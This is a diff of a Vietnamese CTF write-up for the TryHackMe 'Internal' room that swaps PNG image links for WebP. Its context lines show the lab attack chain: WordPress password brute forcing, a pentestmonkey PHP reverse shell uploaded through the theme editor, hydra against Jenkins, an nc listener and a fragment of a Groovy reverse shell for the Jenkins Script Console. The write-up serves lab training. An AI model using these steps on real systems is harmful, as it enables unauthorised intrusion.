@@ -18,7 +18,7 @@ categories: ctf
 0. this unordered seed list will be replaced by toc as unordered list
 {:toc}
 
-![intro](/assets/img/2021-12-05-THM-Internal/1.png)
+![intro](/assets/img/2021-12-05-THM-Internal/1.webp)
 
 Xin chào, Lẩu đây. Hôm nay tôi sẽ giải CTF [Tryhackme - Internal](https://tryhackme.com/room/internal)
 
@@ -46,15 +46,15 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Thử check qua trang web, vì nó chỉ là 1 trang mặc định nên sau khi thử qua vài path cơ bản thì tôi sẽ tìm web path luôn.
 
-![web path](/assets/img/2021-12-05-THM-Internal/2.png)
+![web path](/assets/img/2021-12-05-THM-Internal/2.webp)
 
 Vậy là trang này được build bằng Wordpress. Tuy nhiên khi thử vào blog thì nó hơi lạ
 
-![site](/assets/img/2021-12-05-THM-Internal/3.png)
+![site](/assets/img/2021-12-05-THM-Internal/3.webp)
 
 Vậy nên tôi đã thêm ip và domain vào file host để nó trở về trang php
 
-![php-site](/assets/img/2021-12-05-THM-Internal/4.png)
+![php-site](/assets/img/2021-12-05-THM-Internal/4.webp)
 
 Bây giờ thì thử dùng Wpscan xem có tìm được gì đặc biệt ở đây không.
 
@@ -172,11 +172,11 @@ Trying admin / lizzy Time: 00:07:19 <======                                     
 
 Login vào Wordpress thôi
 
-![dashboard](/assets/img/2021-12-05-THM-Internal/5.png)
+![dashboard](/assets/img/2021-12-05-THM-Internal/5.webp)
 
 Bây giờ thì tìm đến themes và thử upload php shell. Tôi hay sử dụng php shell của [pentestmonkey](https://pentestmonkey.net/tools/web-shells/php-reverse-shell). 
 
-![upload shell](/assets/img/2021-12-05-THM-Internal/6.png)
+![upload shell](/assets/img/2021-12-05-THM-Internal/6.webp)
 
 Sau khi đã 'Update File', tôi tạo listener với port 2402 giống như trong shell vừa upload. Sau đó truy cập vào file vừa sửa 
 
@@ -273,11 +273,11 @@ Jenkins đang chạy local với port 8080. Để truy cập được port này,
 
 Truy cập vào localhost với port 2402
 
-![jenkins](/assets/img/2021-12-05-THM-Internal/7.png)
+![jenkins](/assets/img/2021-12-05-THM-Internal/7.webp)
 
 Sau khi thử các user-pass đơn giản đều không có kết quả, tôi vẫn phải dùng đến brute force, và lần này tôi dùng *hydra*. Nhưng trước đó phải dùng BurpSuite để lấy form đăng nhập.
 
-![login-form](/assets/img/2021-12-05-THM-Internal/8.png)
+![login-form](/assets/img/2021-12-05-THM-Internal/8.webp)
 
 Bây giờ thì thử brute force với username mặc định của Jenkins là *admin*
 
@@ -304,7 +304,7 @@ String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(tru
 
 Vào Jenkins > Manage Jenkins > Script Console và nhập đoạn code phía trên vào. À tuy nhiên trước đó thì phải tạo listener với port 12345: `nc -lnvp 1235`
 
-![script-console](/assets/img/2021-12-05-THM-Internal/9.png)
+![script-console](/assets/img/2021-12-05-THM-Internal/9.webp)
 
 ```python
 ┌──(neo㉿kali)-[~]
